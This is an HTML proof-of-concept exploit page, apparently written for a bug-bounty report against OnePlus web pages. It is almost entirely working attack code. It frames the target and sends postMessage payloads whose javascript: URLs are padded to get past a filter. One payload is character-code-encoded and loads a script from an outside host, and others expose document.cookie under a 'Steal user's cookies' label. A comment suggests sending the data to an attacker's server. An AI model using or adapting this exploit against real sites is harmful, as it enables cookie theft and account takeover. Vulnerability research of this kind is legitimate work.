<!DOCTYPE HTML>
<html>
<iframe src="https://my.oneplus.com/cn/order?from=head#" id="sendmessage"></iframe>
<div>
Steal user's cookies
<textarea id="cookie" width=500px height=600px style="margin: 0px; height: 330px; width: 505px;"></textarea>
</div>
<button id="openH1">Other way-Click Here for start</button>
<button id="stealaccount">Show customers's cookies with pop-windows</button>
<script>
var victim = document.getElementById('sendmessage').contentWindow;
window.attackSuccess = false;
window.addEventListener('message', function(e) {
        console.log('Get data from oneplus ---> ' + e.data);
	document.getElementById('cookie').innerHTML = e.data;
    }, false);
var payload = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});	
	
	
setTimeout(function(){
	victim.postMessage(payload,"*");
}, 5000);

	
	//Other ways only pop the window for show cookies
function openWin(){
	const h1Win = window.open("https://www.oneplus.com/cn",'_blank');
	let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
                h1Win.postMessage(data,"*");
		window.attackSuccess = true;
            }
        }, 4000)
    }

function sendMessage(){
	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
	//you can change the url payload for send back some sensitive information to the attacker's server
	window.h1Win.postMessage(data,"*");
	}
	
document.getElementById("openH1").addEventListener('click', openWin);
document.getElementById("stealaccount").addEventListener('click', sendMessage);
</script>
</html>
